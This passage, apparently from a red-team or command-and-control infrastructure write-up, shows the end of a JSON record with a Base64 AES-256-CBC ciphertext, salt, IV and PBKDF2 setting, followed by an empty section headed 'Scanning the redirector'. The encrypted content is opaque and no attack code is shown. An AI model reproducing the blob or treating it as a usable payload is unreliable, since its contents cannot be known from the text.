    "CipherTextBase64":  "kUwAPbf+f4VgEwLCPXkKbRU2L5CO1NL7Dnm1uScB7s8+B0Y+zNeAAKWhrfMY4tuWbjM8Q1Cn0edrk9g7reY5U25riil7ICbAJNi6AUJBlNnQq32CpjuFWfgturzuOPSUYyRAdFBJV3QhygeWANx4mTPWwOjYKE0F3wHPzqTWzS03U4c6WegD8ltufv0i3youl59Cw9tLhYoVZf8XSQ8NOS4PLXv/ohz/blmjbIAtxL4dU91S0yzqF4H6rew9HHbph4Hfpzc9yB0Hz6us86vIcVPNMzQlMSYfBTdV5f6vmoDwusedevnqMFNyfhaq4wztVWjbDw2H2v8lrdHlpCAbw/XvogSRczxRpWayGKnnEVXqd9ruu4RGVFx8XCkYMasqzaTslMifFC5buP5izkHIo0gnebzex04YpijMD9sciCGXQ7VeGqUuc46FFtoDok+FONbo+NvH7113m0/3CuwJv5ZMEwkLz+Rhq37yrhl/cHK9Ta437n181zWnT1CIcj7h+1NjYM+Wk7YPusZMR5iDWvaEcXWvjzLSxsR6CJ+3tLiTA/r3YNb6fu8YP0K1jcCi7GlbQyjBUJeSFhLKtyVuWSRNr0NGxV6Mtba/KNPd2nStlo96FYjLgNBDFK6K2MCadw0mbXnkIQo/AEG2cPN2FcAwxsYoB8HZ0uusPLBSHNv1LfCed6eQEMT/nf2VBxXdNIe7zYShP+EKR9pvxfepg23msZ6bHwwnlLhXsVbYRLkKyvVH9OojpuB3zLVYMZ/DxmgkvEVpJC2n1ln2KNpc6ut9OHQeaDx9QXfjDBv6Brg1+QaBvudgNZyrvSibM3aFCQcgDPS0ff9nipsKQ/m3a+bNzwChXlJkGCjLTtpW80geJKijnOdtkQVA90psiwNQBn5PSv5+pruJgYEr8Ysy3gwgry5hqVFMgpz8c6PupmXjYsPtRD4VvObl8R372Oxxjl2Ug0GVNxP+nuWcz1YR6/IGCRSSFgem5W4bB6ry6/ym10c07loquyppuK53qJ9ixuFMSn9d+kzNFHUe1l2ItDDhOSFpvrkeFjy/1/4aLRUqcbA4e/rmQlWJ5Fbu7roh9EhAEz+Dhsmmo1sowAxtilkNQTL/qzYzFBlGnfrW27TK3fXzdTQUAY+94jTJaPf9OKOoXLt+uL+N6fvSNkR3IvY7TyfJRsBHUeU1cOiJ7dzZyYGr4/0DXkWXQDET/bDk/VVpd1eaLjD1/Eql/1mqPSITFAuolC+iwNIn/XhHrVai76T43bW/FyHnM2zERm12vGd/TiXS2Gvz4DhihqR6aWydde4dirSTi34QlU/xqBY9730w8RiWzhmc02eeYR/FOMTzw7ViB7ifATcyKPT3GAvpb3AYisf8OsIkrE+uGjTwVOxJ/36R5DQNZ1L4GGGFcYk4ZjLFobNQ6xj5hQWxsabvWrQCQGa1A0nQBcM3bXpgc098AtdwE4/23C13MRXtha1zGl6NVD99frIGsfRYDHZo49mXOU4mzfkHklPC0Hzs6BPlhpY45o2TEvU0hyrpmSReZ3TmI9+bySlFOvE0P/gjyl8sPWCt+5ePRERlc2k=",
    "SaltBase64":  "DPZ0kDT+oITx1misu24UlQ==",
    "IvBase64":  "gjJvHMlyrrEeB8M7twuo5Q==",
    "Kdf":  "PBKDF2-SHA1-10000",
    "Cipher":  "AES-256-CBC"
}

```


---
# Scanning the redirector
```

```